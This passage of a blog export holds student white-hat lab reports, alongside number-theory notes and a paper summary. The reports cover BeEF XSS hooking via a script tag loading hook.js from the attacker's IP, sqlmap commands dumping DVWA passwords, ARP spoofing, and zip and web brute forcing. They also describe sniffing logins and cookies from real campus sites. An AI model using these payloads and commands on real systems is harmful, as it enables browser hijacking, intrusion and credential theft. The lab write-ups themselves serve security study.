整数分解定理 重要知识点 ¶如何证明一个数是素数： 用Eratosthenes筛法（平凡判别P7） 具体：对于一个数n，所有p&lt;n1/2p&lt; n^{1/2}p&lt;n1/2，均无法整除n，则n是一个素数 其欧拉函数即 φ(m)=m−1φ(m)=m−1φ(m)=m−1的时候，m是一个素数 P68 对于模m的最小正数完全剩余系等于其最小正数简化剩余系的时候，m是一个素数 利用Wilson定理，如果一个整数n，(n−1)!+1≡0(mod n)(n-1)!+1 \\equiv 0 (mod \\ n)(n−1)!+1≡0(mod n)时，n是一个素数 P118 ¶N的B进制的表示： P9 N=Ak−1Bk−1+......+A1B+A0N = A_{k-1}B_{k-1}+......+A_1B+A_0N=Ak−1​Bk−1​+......+A1​B+A0​ ¶如何确定一个整数d是an......a0a_n ...... a_0an​......a0​的最大公因数： P20 （1）d∣an,d∣an−1...,d∣a0d|a_n,d|a_{n-1}...,d|a_0d∣an​,d∣an−1​...,d∣a0​ == &gt; d可以整除所有的aia_iai​ （2）对于一个数e，若e∣an...e∣a0e|a_n ... e|a_0e∣an​...e∣a0​则e|d; ¶如何计算两个数的最大公因数？ ¶1.广义欧几里得除法： P22 利用（a，b）=（b，c），一步一步的缩小 ¶2.贝祖公式 P25 🌿 贝祖等式：sa+tb=（a，b） 证明在 P27 如何求s和t？ 上面已经给出了Python代码的实现； ¶3. 如果形式为(2a−1,2b−1)(2^a-1,2^b-1)(2a−1,2b−1) 其最大公因数为2(a,b)−12^{(a,b)}-12(a,b)−1 ,P37 ¶4. 如果知道最小公倍数 P39 (a,b)=a⋅b[a,b](a,b)=\\frac{a \\cdot b}{[a,b]} (a,b)=[a,b]a⋅b​ ¶如何确定一个整数D是a1...ana_1 ... a_na1​...an​的最小公倍数？ P39 （1）ai∣Da_i | Dai​∣D （2）若ai∣D′a_i|D&#x27;ai​∣D′,则D｜D’ ¶如何构造两个互素的数？ 利用基础性质 (a(a.b),ba.b)=1(\\frac{a}{(a.b)},\\frac{b}{a.b})=1 ((a.b)a​,a.bb​)=1 构造一个ad-bc=1 则(a , b) = 1 通过一个已知的（u，v）= 1构造出（a，b）= 1 P35 (ab)=(qrst)(uv)\\begin{gathered} \\begin{pmatrix} a \\\\ b \\end{pmatrix} = \\begin{pmatrix} q &amp; r \\\\ s &amp; t \\end{pmatrix}\\begin{pmatrix} u \\\\ v \\end{pmatrix} \\end{gathered} (ab​)=(qs​rt​)(uv​)​ qt - sr = 1，可以得到，a = qu + rv；b = su + tv； 对于已知的（a，b）= 1，(2a−1,2b−1)=1(2^a - 1,2^b - 1)=1(2a−1,2b−1)=1 ==&gt; P37","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【白帽子学习笔记】XSS和SQL注入","slug":"【白帽子学习笔记】XSS和SQL注入","date":"2020-11-17T09:10:23.000Z","updated":"2020-12-19T05:23:15.146Z","comments":true,"path":"2020/11/17/【白帽子学习笔记】XSS和SQL注入/","link":"","permalink":"http://example.com/2020/11/17/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/","excerpt":"【白帽子学习笔记】XSS和SQL注入 yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮ @[toc] ¶0x01 实验知识点 ¶1x01 什么是XSS？ XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 ¶1x02 什么是Cookie？ Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。","text":"【白帽子学习笔记】XSS和SQL注入 yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮ @[toc] ¶0x01 实验知识点 ¶1x01 什么是XSS？ XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 ¶1x02 什么是Cookie？ Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。 ¶1x03 XSS漏洞的分类 存储型 XSS：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。 如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个定时炸弹放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。 存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。 DOM-Based XSS漏洞： DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。 由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。 **反射型XSS：**仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。 关于反射型的XSS漏洞，我之前的博客也有进行整理，链接如下 【白帽子学习笔记13】DVWA 反射型XSS（跨站点脚本攻击） ¶1x04 SQL注入攻击 所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 为什么会有SQL注入攻击？ 很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。 因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。 关于SQL注入的常用语法我也有进行整理，链接如下： 【白帽子学习笔记14】SQL注入常用语句 【白帽子学习笔记15】XVWA SQL Injection ¶0x02 XSS部分：Beef ¶1x01 搭建GuestBook网站 本次实验中我在Win Server 2003中搭建了Guestbook环境（IIS），搭建过程中需要注意以下几点 在搭建IIS配置完成后注意将网站所在的文件夹权限打开，将Everyone用户组给到改文件夹的完全控制权限。 如果使用Windows Server可能需要手动配置一下IP和网关使其与其他虚拟机处于同一网段。 本次实验中虚拟机网络模式：Net模式 ¶1x02 AWVS扫描 首先我们使用AWVS扫描刚才搭建的网站 接下来一路继续就行，可能需要添加一个密码。然后就可以正常进行扫描了，扫描结果如下： 发现在error.asp和add.asp分别都有一个XSS漏洞。 ¶1x03 Kail中使用Beef生成恶意代码 现在Kail-2020中应该是没有自带Beef了，我们需要自己安装一下 sudo apt-get install beef-xss 然后cd进入到这个文件夹中： cd /usr/share/beef-xss 输入： ./beef即可启动 第一次的时候可能会提醒你不要使用默认的账号和密码，就像下面这样： 我们进入到提示的文件夹中进行一下修改 用vim打开一下：sudo vim /etc/beef-xss/config.yaml 不会使用vim的建议百度搜索一下用法，linux下经常会用到。 我把账号和密码都修改为了beeff，之后保存退出。再输入 ./beef 使用默认用户可能会导致你安装失败 输入su然后输入root密码，切换为root权限，然后再输入./beef 会提示你现在已经启动了，然后打开kali中自带的firefox浏览器。进入到： http://127.0.0.1:3000/ui/authentication 输入你刚才设置的账号和密码，就可以成功的登陆了。 访问一下hook.js里面有自带的恶意代码 只要访问到这个网站，对方的浏览器就会被劫持。 ¶1x04 XSS注入漏洞 ¶2x01 XSS劫持网站 现在使用自己的本机访问留言簿的网站，并将XSS注入恶意代码。 XSS注入代码如下： &lt;script src=&quot;http://Kali的IP地址:3000/hook.js&quot;&gt;&lt;/script&gt; 现在进入到这个当中我们可以发现已经成功了，而且看不到刚才写的代码，说明代码已经被成功的加载进去了！ 刷新一下界面，可以发现会有一个弹框： 然后再回到kali里面的beef管理界面看一下，可以发现10.34.80.1也就是我的本机已经被劫持了！ 可以使用他干一些奇怪的事情，还有查询一些信息 ¶2x02 劫持浏览器指定被劫持网站为学校主页 在命令中选择，Redirect Browser，填入学校地址，然后点击Execute。就可以发现网页被重定向了。 本次实验中的XSS攻击属于注入型XSS攻击。 ¶0x02 SQL注入（DVWA+SQLMAP+Mysql） ¶1x01 实验环境搭建 打开Metasploitable2后，里面有搭建好的DVWA，访问http://Metasploitable的IP/dvwa即可 在low级别的SQL Injection中进行SQL注入的尝试： 输入1，可以正常显示： 输入1’ 报错 可以判断此处有报错： 下面使用sqlmap进行攻击 SQLMAP基本语法： -u:指定目标URL –cookie：当前会话的cookies值 -b：获取数据库类型，检查数据库管理系统标识 –current-db：获取当前数据库 –current-user：获取当前数据库使用的用户 -string：当查询可用来匹配页面中的字符串 -users：枚举DBMS用户 -password：枚举DBMS用户密码hash ¶1x02 枚举当前数据库名称和用户名 查询一下当前的数据库： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-db -u后是需要攻击的url 因为dvwa是需要登陆的，需要cookie用作身份验证，可以通过浏览器F12抓包获取 –current-db表示查询当前数据库 然后查询一下当前的使用者： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-user ¶1x03 枚举数据库用户名和密码 枚举数据库的表名： 因为我们是dvwa所以爆破dvwa数据库中的数据表 sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa --tables 枚举数据表中的列名： 根据上面的枚举结果，我们应该是要看users数据表中的内容： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users --columns 枚举数据表中的用户和密码： 查询到users数据表中有那么多的字段，我们想要的数据应该就在user和password中了 sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users -C user,password --dump 这里会询问你是否使用Kali中自带的字典进行攻击，选择是就好了 最后得到结果： ¶0x03 实验小结 在本次的实验中学习了两种最常见的漏洞：XSS漏洞和SQL注入漏洞，在实验过程中具体的掌握了如下知识点： 如何使用扫描器AWVS 如何向网站中注入XSS漏洞 如何使用Beef利用网站中的XSS漏洞 如何使用SQLMAP利用网站的注入漏洞","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"【白帽子学习笔记】网络嗅探与身份验证","slug":"【白帽子学习笔记】网络嗅探与身份验证","date":"2020-11-04T23:20:59.000Z","updated":"2020-12-19T05:04:03.091Z","comments":true,"path":"2020/11/05/【白帽子学习笔记】网络嗅探与身份验证/","link":"","permalink":"http://example.com/2020/11/05/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/","excerpt":"@一个在写实验报告的人，/(ㄒoㄒ)/~~ 0x01 网络嗅探相关概念 ¶1x01 网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧： 帧的目标区域具有和本地网络接口相匹配的硬件地址； 帧的目标区域具有“广播地址”。","text":"@一个在写实验报告的人，/(ㄒoㄒ)/~~ 0x01 网络嗅探相关概念 ¶1x01 网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧： 帧的目标区域具有和本地网络接口相匹配的硬件地址； 帧的目标区域具有“广播地址”。 如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。 在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，SWITCH比HUB更聪明，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。 交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有MAC洪水包和ARP欺骗。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的&quot;打开失效&quot;模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。 ¶1x02 ARP欺骗 每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是&quot;如果你有此IP地址，请告诉我你的MAC地址&quot;，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。 ARP报文格式： 可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到ARP欺骗的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。 ¶1x03 密码安全 在现实网络中，攻击事件发生的频率越来越高，其中相当多的都是由于网站密码泄露的缘故，或是人为因素导致，或是口令遭到破解，所以从某种角度而言，密码的安全问题不仅仅是技术上的问题，更主要的是人的安全意识问题。 口令破解方法 口令破解主要有两种方法：字典破解和暴力破解。 字典破解是指通过破解者对管理员的了解，猜测其可能使用某些信息作为密码，例如其姓名、生日、电话号码等，同时结合对密码长度的猜测，利用工具来生成密码破解字典。如果相关信息设置准确，字典破解的成功率很高，并且其速度快，因此字典破解是密码破解的首选。 而暴力破解是指对密码可能使用的字符和长度进行设定后（例如限定为所有英文字母和所有数字，长度不超过8），对所有可能的密码组合逐个实验。随着可能字符和可能长度的增加，存在的密码组合数量也会变得非常庞大，因此暴力破解往往需要花费很长的时间，尤其是在密码长度大于10，并且包含各种字符（英文字母、数字和标点符号）的情况下。 口令破解方式 口令破解主要有两种方式：离线破解和在线破解。 离线破解攻击者得到目标主机存放密码的文件后，就可以脱离目标主机，在其他计算机上通过口令破解程序穷举各种可能的口令，如果计算出的新密码与密码文件存放的密码相同，则口令已被破解。 候选口令产生器 候选口令产生器的作用是不断生成可能的口令。有几种方法产生候选口令，一种是用枚举法来构造候选口令（暴力破解），另一种方法是从一个字典文件里读取候选口令（字典破解）。 口令加密 口令加密过程就是用加密算法对从口令候选器送来的候选口令进行加密运算而得到密码。这要求加密算法要采用和目标主机一致的加密算法。加密算法有很多种，通常与操作系统或应用程序的类型和版本相关。 Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工具使用Java编写，由PortSwigger Security开发。该工具有两个版本。可免费下载的免费版（免费版）和试用期后可购买的完整版（专业版）。免费版本功能显着降低。它的开发旨在为Web应用程序安全检查提供全面的解决方案，Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞。 0x02 网络嗅探部分 ¶1x01 sinffer（Wireshark抓包） A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。 我们选择Metasploit2主机作为A，Kali作为B。首先我们需要确认kali和Windows处于同一网段（可相互ping通的状态)。（PS：这一步是使用的Metasploit2，后面因为需要到网页里面提交数据就换成了win7） 接下来在kali中打开Wireshark，如果想要抓源只为A的数据，那么过滤语句为： ip.src == 10.34.80.4 接下来我们使用A去ping B观察一下wireshark的反应。 但是如果A ping的是百度，或者往某一个网址发送包含账号和密码的HTTP报文。就可以获取相应信息。 ¶1x02 ARP欺骗 关于ARP的原理已经攻击原理我在以前的一篇博客中有写到： 【白帽子学习笔记20】arp协议原理与攻击应用 为了欺骗B，让B把报文全部发到A这里来。A需要冒充局域网中交换机的角色。（此时B为Win7主机） 这一步我们需要使用一个工具就是arpspoof。在安装这个包的过程中可能会遇到一些坑。下面记录一下我遇到的一些问题。 建议更换kali源，否则有可能出现找不到的情况 安装过程使用sudo apt-get install dsniff而不是直接install arpspoof 这里我们使用单向攻击： 受攻击主机将数据发送到攻击主机，并由攻击主机转发至网关，网关将数据发送至服务器，服务器返回数据给网关，网关返回数据给受攻击主机 步骤如下： 开启端口转发，允许本机像路由器那样转发数据包 echo 1 &gt; /proc/sys/net/ipv4/ip_forward ARP投毒，向主机B声称自己(攻击者)就是网关 arpspoof -i eth0 -t IP1 IP2(IP1是我们的攻击目标、IP2是网关IP地址) 首先确认Win7的IP地址，然后确认网关地址。 接下来查询网关： wireshark抓包分析 我们使用Win7尝试访问一下百度。 接下来到wireshark里面看一下。修改wireshark的筛选规则为ip.src == 10.34.80.3。结果可以看到成功抓取到了数据！ 接下来我们选择一个网站输入以下账号密码。就选择大家&quot;最爱&quot;的X班吧. 我记得他的信息上传是没有加密的。 点击登陆； 之后在wireshark里查找发送到易班服务器的http post包。 但是最后发现某班的密码是加密发送的，所以账号密码信息还是不能获得。但是可以从包里面获取到cookie信息，这样再通过Chrome修改cookie的插件就可以完成免密登陆。 由于没有完成任务，我们切换到某大学的学生选课系统的登陆界面。 经过相同的操作之后抓到了包。 在数据报里面成功的发现我过程输入的账号和密码的明文信息。 ¶1x03 WireShark分析文件 1.如何发现有FTP服务器？且找到FTP服务器的IP地址？ 通过观察流量数据，可以发现有大量基于FTP协议传输的数据库，所以推测有FTP服务器。 通过对部分数据包的分析，比如如下两个： 可以知道192.168.182.1是FTP文件服务器。 2.客户端登陆FTP服务器的账号和密码分别是什么？ 通过这两个数据包可以确定服务器的账号和密码。 3.客户端从FTP下载或查看了2个文件，一个是zip文件，一个是txt文件，文件名分别是什么？ 在数据包中可以发现，用户分别查看了1.zip 和 复习题.txt 4.还原ZIP文件并打开 这里我们需要知道的一个知识是对FTP服务器的操作虽然是基于FTP协议解决的，但是真正在下载文件的时候还是使用tcp协议。所以需要zip数据包的时候需要在TCP数据包里面找，可以根据zip文件的文件头和文件尾快速的确认zip包的位置。 将原始数据另存为a.zip, 可以得到一个正常的压缩包，但是有密码。 我们使用kali下的fcrakzip密码破解工具，对zip进行破解。先sudo apt-get install fcrackzip安装 破解命令 fcrackzip -b -c1 -l 6 -u a.zip 接下来解释一下这个命令。 -b：使用暴力模式 -c1：使用纯数字进行破解 -l：规定破解密码长度/范围 -u：使用unzip 最后得到了我们的小企鹅。 5.TXT的内容是什么？ 通过追踪TXT信息，可以确定文件内容如下： 6. 网站密码破解部分： 为了合法的完成渗透测试报告，我们选择Bugku中一道需要运用到暴力破解的题目为例，解析一下如何运用Burp Suite爆破一个网站。 网站网址: http://123.206.87.240:8002/baopo/ 看到这个5位的密码，在检查源码和抓包之后都没有发现什么端倪，尝试bp一波 这里想尝试一下5位数字，5位字母需要的时间太长了. 使用BP自带的字典就可以满足我们的需求 这里可以根据Length的大小来判断时候爆破出密码，密码正确和密码错误的返回长度肯定是不一样的。 爆破成功啦！ ¶1x04 MD5破解 打开一个在线md5解密网站就可以解开简单的md5码。 ¶1x05 John the Ripper John the Ripper 是一款速度很快的密码破解工具，目前可用于 Unix、macOS、Windows、DOS、BeOS 与 OpenVMS 等多种操作系统。最初其主要目的是检测弱 Unix 密码，而现在，除了支持许多 Unix crypt(3) 密码哈希类型，John the Ripper “-jumbo”版本还支持数百种其它哈希类型和密码。 0x03 做有所得 ¶1x01 如何防止ARP攻击 终端对网关的绑定要坚实可靠，这个绑定能够抵制被病毒捣毁。 接入路由器或网关要对下面终端IP-MAC的识别始终保证唯一准确。 网络内要有一个最可依赖的机构，提供对网关IP-MAC最强大的保护。它既能够分发正确的网关信息，又能够对出现的假网关信息立即封杀。 ¶1x02 安全的密码（口令）应遵守的原则 避免出现弱密码 记住的密码才是好密码 每个平台密码最好能够有一定的区别 ¶1x03 字典的重要性 在破解密码或密钥时，逐一尝试用户自定义词典中的可能密码（单词或短语）的攻击方式。与暴力破解的区别是，暴力破解会逐一尝试所有可能的组合密码，而字典式攻击会使用一个预先定义好的单词列表（可能的密码）。对于暴力破解社会工程学是经常用到的方法。根据社会工程学生成的字典可以极大的增大密码破译的成功率。 ¶1x04 小结 通过本次的实验我们学习到了以下内容： 什么是网络嗅探 ARP协议原理 FTP协议 如何使用WireShark抓包并对数据包进行分析 MD5加密方式 如何使用密码字典爆破数据 密码安全 通过这次的实验我对网络嗅探有了比较充分的了解，对网络中的协议如ARP，FTP等又有了更深的了解。可以更加熟练的使用WireShark, 了解了暴力破解网站和压缩文件的基本操作。以及对于密码安全防护的意识加强。收益良多","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"【论文阅读】Conditional Convolutions for InstanceSegmentation","slug":"【论文阅读】Conditional-Convolutions-for-InstanceSegmentation","date":"2020-10-29T22:57:18.000Z","updated":"2020-11-09T00:24:19.872Z","comments":true,"path":"2020/10/30/【论文阅读】Conditional-Convolutions-for-InstanceSegmentation/","link":"","permalink":"http://example.com/2020/10/30/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Conditional-Convolutions-for-InstanceSegmentation/","excerpt":"0x01 概要 Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。","text":"0x01 概要 Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。 CondInst有两个优点： 1）通过完全卷积网络解决实例分割，消除了ROI裁剪和特征对齐的需要； 2）由于动态生成条件卷积的能力大大提高，掩模头可以非常紧凑（例如，3转换层，每个只有8个通道），导致明显更快的推断。 0x02 Mask-RCNN的缺点 实例分割是计算机视觉中的一项基本而又具有挑战性的任务，它需要一种算法来预测图像中每个感兴趣的实例的每像素掩模。尽管最近提出了一些工作，但实例分割的主流框架仍然是两阶段方法Mask R-CNN，它将实例分割转化为两阶段的检测和分割任务。Mask R-CNN首先使用一个更快的对象检测器R-CNN来预测每个实例的边界框。然后在每个实例中，使用roiallign操作从网络的特征图中裁剪出感兴趣的区域（roi）。为了预测每个实例的最终掩模，将一个紧凑的全卷积网络（FCN）（即掩模头）应用到这些roi上，以执行前景/背景分割。 1） 由于ROI通常是轴对齐的边界框，对于形状不规则的对象，它们可能包含大量不相关的图像内容，包括背景和其他实例。这个使用旋转roi可以缓解这个问题，但代价是更复杂的管道。 2） 为了区分前景实例和背景内容或实例，掩码头需要一个相对较大的接受域来编码足够大的上下文信息。因此，在掩模头中需要一组3×3的卷积（例如，掩模R-CNN中有4个3×3卷积，256个通道）。它大大增加了掩模头的计算复杂度，导致推理时间在实例数上有显著变化。 3） ROI的大小通常不同。为了在现代深度学习框架中使用有效的批处理计算，通常需要调整大小操作来将裁剪区域调整为相同大小的补丁。例如，Mask R-CNN会将所有裁剪区域的大小调整为14×14（使用反褶积将采样率提高到28×28），这限制了实例分段的输出分辨率，因为大型实例需要更高的分辨率来保留边界的细节 0x03 为什么FCNs在实例分割上的效果不好 我们发现，将模糊神经网络应用于实例分割的主要困难在于相似图像的出现可能需要不同的预测，但FCNs难以实现这一点。例如，如果在一个input image中有两个外观相似的人A和B，那么在预测A的实例掩码时，FCN需要将B预测为background 